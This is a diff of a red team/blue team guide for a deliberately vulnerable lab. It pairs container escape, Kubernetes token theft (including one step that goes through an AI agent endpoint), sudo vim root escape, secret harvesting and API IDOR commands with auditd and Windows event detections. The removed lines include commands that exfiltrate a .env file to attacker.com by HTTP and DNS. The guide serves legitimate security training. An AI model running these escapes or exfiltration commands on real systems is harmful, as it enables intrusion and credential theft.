-    Select-Object TimeCreated, @{N='TaskName';E={$_.Properties[0].Value}}
-```
-
-**Detection - Sysmon (Event ID 1):**
-```powershell
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} |
-    Where-Object {$_.Properties[4].Value -like "*schtasks*"} |
-    Select-Object TimeCreated, @{N='CommandLine';E={$_.Properties[10].Value}}
-```
-
----
-
-# PART 3: LINUX & CONTAINERS
-
----
-
-## 🐳 VECTOR 15: Container Escape
-
-| Property | Value |
-|----------|-------|
-| **Target** | `/home/vagrant/container_lab/` |
-| **Containers** | `vuln_privileged`, `vuln_hostsock` |
-| **Difficulty** | 🟡 Medium |
-| **MITRE** | T1611 |
-
-### 🔴 Red Team
-
-**Privileged Container Escape:**
+**1. Get ServiceAccount Token:**
 ```bash
-docker exec -it container_lab-vuln_privileged-1 bash
+# Via AI Agent
+curl "http://10.0.0.20:5000/ask?query=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token"
 
-# Inside container
-fdisk -l  # Find host disk
-mount /dev/sda1 /mnt
-chroot /mnt
-cat /etc/shadow
+# Or locally
+kubectl get secret -o jsonpath='{.items[?(@.metadata.annotations.kubernetes\.io/service-account\.name=="vuln-admin-sa")].data.token}' | base64 -d
 ```
 
-**Docker Socket Escape:**
+**2. Use Token:**
 ```bash
-docker exec -it container_lab-vuln_hostsock-1 bash
-
-# Inside container (install docker CLI first)
-apt update && apt install -y docker.io
-docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host
-```
-
-### 🔵 Blue Team
-
-**Detection - auditd:**
-```bash
-# Watch mount syscalls
-sudo ausearch -sc mount -i | tail -20
-
-# Watch docker socket access
-sudo ausearch -f /var/run/docker.sock -i
-```
-
-**Detection - Docker Events:**
-```bash
-docker events --filter 'type=container' --filter 'event=exec_create'
-```
-
----
-
-## ☸️ VECTOR 16: Kubernetes Attacks
-
-| Property | Value |
-|----------|-------|
-| **Target** | `/home/vagrant/k8s_lab/vuln-sa.yaml` |
-| **ServiceAccount** | `vuln-admin-sa` (cluster-admin) |
-| **Difficulty** | 🟡 Medium |
-| **MITRE** | T1610 |
-
-### 🔴 Red Team
-
-**1. Check Permissions:**
-```bash
-kubectl auth can-i --list --as=system:serviceaccount:default:vuln-admin-sa
-```
-
-**2. Extract Secrets:**
-```bash
-kubectl get secrets -A -o yaml --as=system:serviceaccount:default:vuln-admin-sa
+kubectl --token=$TOKEN --server=https://10.0.0.20:6443 --insecure-skip-tls-verify get secrets -A
 ```
 
 **3. Deploy Privileged Pod:**
@@ -783,170 +564,223 @@ EOF
 
 ### 🔵 Blue Team
 
-**Detection - Audit Logs:**
+**Detection:**
 ```bash
-# K3s audit (if enabled)
+# K8s API audit logs
 sudo cat /var/log/containers/kube-apiserver* | grep -E "secrets|privileged"
-```
-
-**Detection - auditd:**
-```bash
-sudo ausearch -c kubectl -i | tail -50
 ```
 
 ---
 
-## 🐧 VECTOR 17: Linux Privilege Escalation
+## 🔓 VECTOR 12: Privileged Container
 
 | Property | Value |
 |----------|-------|
-| **Target** | sudo, capabilities |
-| **Difficulty** | 🟢 Easy |
-| **MITRE** | T1548 |
+| **Container** | `vuln_priv` |
+| **Vulnerability** | `--privileged` flag |
+| **Tools** | Docker escape exploits |
 
 ### 🔴 Red Team
 
-**Sudo vim Escape:**
+**1. Enter Container:**
 ```bash
-sudo vim -c ':!/bin/bash'
-# Now root
+docker exec -it container_lab-vuln_priv-1 bash
 ```
 
-**Python Capabilities:**
+**2. Find Host Disk:**
 ```bash
-/usr/local/bin/python_cap -c 'import os; os.setuid(0); os.system("/bin/bash")'
-# Now root
+fdisk -l
+# Find /dev/sda1
+```
+
+**3. Mount and Escape:**
+```bash
+mkdir /mnt/host
+mount /dev/sda1 /mnt/host
+chroot /mnt/host
+# Now on HOST as root
 ```
 
 ### 🔵 Blue Team
 
-**Detection - auditd:**
+**Detection:**
 ```bash
-# Watch sudo commands
-sudo ausearch -m USER_CMD -i | tail -20
+# Monitor mount syscalls
+sudo ausearch -sc mount -i
 
-# Watch setuid calls
-sudo ausearch -sc setuid -i
-```
-
-**Detection - Login Shell Changes:**
-```bash
-# Monitor /etc/passwd changes
-sudo ausearch -k identity -i
+# Docker events
+docker events --filter 'type=container'
 ```
 
 ---
 
-## 📤 VECTOR 18: Data Exfiltration
+## 🔓 VECTOR 13: Docker Socket Mount
 
 | Property | Value |
 |----------|-------|
-| **Target** | `/home/vagrant/exfil_lab/.env` |
-| **Data** | Fake API keys, AWS credentials |
-| **Difficulty** | 🟢 Easy |
-| **MITRE** | T1048 |
+| **Container** | `vuln_sock` |
+| **Vulnerability** | `/var/run/docker.sock` mounted |
+| **Tools** | docker CLI |
 
 ### 🔴 Red Team
 
-**View Target Data:**
+**1. Enter Container:**
+```bash
+docker exec -it container_lab-vuln_sock-1 bash
+```
+
+**2. Install Docker CLI:**
+```bash
+apt update && apt install -y docker.io
+```
+
+**3. Spawn Privileged Container:**
+```bash
+docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host
+# Now on HOST as root
+```
+
+### 🔵 Blue Team
+
+**Detection:**
+```bash
+# Monitor docker socket access
+sudo ausearch -f /var/run/docker.sock
+
+# Watch for new containers
+docker events --filter 'event=create'
+```
+
+---
+
+## 🔓 VECTOR 14: Sudo Misconfiguration
+
+| Property | Value |
+|----------|-------|
+| **User** | `vagrant` |
+| **Vulnerability** | `NOPASSWD: /usr/bin/vim` |
+| **Tools** | Terminal |
+
+### 🔴 Red Team
+
+**Escape to Root:**
+```bash
+sudo vim -c ':!/bin/bash'
+# Now root!
+```
+
+**Alternative:**
+```bash
+sudo vim
+:set shell=/bin/bash
+:shell
+```
+
+### 🔵 Blue Team
+
+**Detection:**
+```bash
+# Monitor sudo commands
+sudo ausearch -m USER_CMD -i | grep vim
+```
+
+---
+
+## 🔓 VECTOR 15: Hardcoded API Secrets
+
+| Property | Value |
+|----------|-------|
+| **Location** | `/home/vagrant/exfil_lab/.env` |
+| **Contents** | Fake AWS/Stripe keys |
+| **Tools** | grep, find |
+
+### 🔴 Red Team
+
+**Find and Extract:**
 ```bash
 cat /home/vagrant/exfil_lab/.env
 # API_KEY=sk_live_1234567890abcdef
 # AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
-```
 
-**HTTP Exfil:**
-```bash
-curl -X POST -d @/home/vagrant/exfil_lab/.env http://attacker.com/collect
-```
-
-**SMB Exfil (via Samba share):**
-```bash
-# From attacker
-smbclient //10.0.0.20/share -N
-put stolen_data.txt
-```
-
-**DNS Exfil:**
-```bash
-data=$(cat /home/vagrant/exfil_lab/.env | base64 -w0)
-nslookup ${data:0:60}.attacker.com
+# Search for more secrets
+grep -r "API_KEY\|SECRET\|PASSWORD" /home/vagrant/ 2>/dev/null
+find / -name "*.env" 2>/dev/null
 ```
 
 ### 🔵 Blue Team
 
-**Detection - File Access:**
+**Detection:**
 ```bash
-sudo ausearch -f /home/vagrant/exfil_lab/.env -i
+# Monitor sensitive file access
+sudo auditctl -w /home/vagrant/exfil_lab/.env -p r -k secrets
+sudo ausearch -k secrets
 ```
 
-**Detection - Network:**
-```bash
-# Watch outbound connections
-ss -tunap | grep -v LISTEN | grep -v "127.0.0.1"
+---
 
-# Watch Samba logs
-sudo tail -f /var/log/samba/log.smbd
+## 🔓 VECTOR 16: API Logic Flaws (vAPI & crAPI)
+
+| Property | Value |
+|----------|-------|
+| **vAPI** | `http://10.0.0.20:5002` |
+| **crAPI** | `http://10.0.0.20:8888` |
+| **Vulnerabilities** | BOLA/IDOR, Mass Assignment |
+| **Tools** | Postman, Burp Suite |
+
+### 🔴 Red Team
+
+**BOLA/IDOR (Access Other Users):**
+```bash
+# Get your user ID
+curl http://10.0.0.20:5002/api/users/1
+
+# Try other IDs
+curl http://10.0.0.20:5002/api/users/2
+curl http://10.0.0.20:5002/api/users/3
 ```
+
+**Mass Assignment:**
+```bash
+# Try to set admin flag
+curl -X POST http://10.0.0.20:5002/api/users -d '{"username":"test","password":"test","isAdmin":true}'
+```
+
+### 🔵 Blue Team
+
+**Detection:**
+- Monitor for sequential ID access patterns
+- Alert on privilege escalation attempts
+- Log all API authentication events
 
 ---
 
 # BLUE TEAM QUICK REFERENCE
 
-## Sysmon Event IDs (DC01)
+## Key Windows Events (DC01)
 
-| ID | Event | Use Case |
-|----|-------|----------|
-| 1 | Process Create | Detect malicious processes |
-| 3 | Network Connection | C2, lateral movement |
-| 5 | Process Terminated | EDR tampering |
-| 7 | Image Loaded | DLL injection |
-| 10 | Process Access | LSASS dumping |
-| 11 | File Create | Malware drops |
-| 12/13 | Registry | Persistence, AMSI bypass |
+| Event ID | Description |
+|----------|-------------|
+| 4768 | Kerberos TGT Request (AS-REP) |
+| 4769 | Kerberos TGS Request (Kerberoast) |
+| 4886 | Certificate Request |
+| 4887 | Certificate Issued |
+| 4104 | PowerShell ScriptBlock |
+| 4688 | Process Creation |
 
-## Security Event IDs (DC01)
+## Key Linux Monitoring (Web01)
 
-| ID | Event | Use Case |
-|----|-------|----------|
-| 4624 | Logon Success | Account usage |
-| 4625 | Logon Failure | Brute force |
-| 4648 | Explicit Credential | Pass-the-hash |
-| 4688 | Process Create | Command lines |
-| 4698 | Task Created | Persistence |
-| 4768 | TGT Request | AS-REP roasting |
-| 4769 | TGS Request | Kerberoasting |
-| 4886/4887 | Certificate Request | AD CS abuse |
-
-## auditd Keys (Web01)
-
-| Key | Watches |
-|-----|---------|
-| `identity` | `/etc/passwd` modifications |
-| `exec` | `/bin/bash` execution |
-
-## Quick Hunting Commands
-
-**Windows - All Sysmon:**
-```powershell
-Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 100 | Out-GridView
-```
-
-**Windows - Suspicious PowerShell:**
-```powershell
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
-    Where-Object {$_.Message -match 'Download|IEX|Invoke-|Base64|bypass|-enc'} |
-    Select-Object TimeCreated, Message
-```
-
-**Linux - Recent auditd:**
 ```bash
-sudo ausearch -i -ts recent
-```
+# auditd - all recent events
+sudo ausearch -ts recent -i
 
-**Linux - Failed Logins:**
-```bash
-sudo grep "Failed password" /var/log/auth.log | tail -20
+# SMB share monitoring
+sudo ausearch -f /home/vagrant/share -i
+
+# Cron monitoring
+sudo tail -f /var/log/syslog | grep CRON
+
+# Docker monitoring
+docker events --filter 'type=container'
 ```
 
 ---
